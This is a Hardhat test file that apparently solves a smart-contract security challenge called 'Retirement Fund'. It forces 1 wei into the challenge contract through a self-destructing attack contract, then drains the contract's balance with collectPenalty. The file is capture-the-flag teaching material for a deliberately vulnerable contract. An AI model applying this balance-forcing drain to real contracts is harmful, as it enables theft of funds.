import { SignerWithAddress as HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import hre from "hardhat";

import { RetirementFundChallenge, RetirementFundChallenge__factory } from "../typechain-types";
import { RetirementFundAttack, RetirementFundAttack__factory } from "../typechain-types";

describe("11. Math -> Retirement Fund", function () {
  let owner: HardhatEthersSigner;
  let player: HardhatEthersSigner;
  let level: RetirementFundChallenge;

  beforeEach(async function () {
    [owner, player] = await hre.ethers.getSigners();
    player;

    const factory: RetirementFundChallenge__factory = new RetirementFundChallenge__factory(owner);
    level = await factory.deploy(player, { value: hre.ethers.parseEther("1") });
    await level.waitForDeployment();
  });

  it("should be completed", async function () {
    // `force feed` target contract
    // deploy contract which will selfdestroy in constructor and send 1 wei to fund contract
    const factory: RetirementFundAttack__factory = new RetirementFundAttack__factory(owner);
    const attack: RetirementFundAttack = await factory.deploy(await level.getAddress(), { value: 1 });
    await attack.waitForDeployment();

    // just collect fund contract's whole balance as a penalty
    const tx = await level.connect(player).collectPenalty();
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    expect(await level.isComplete()).to.be.true;
  });
});
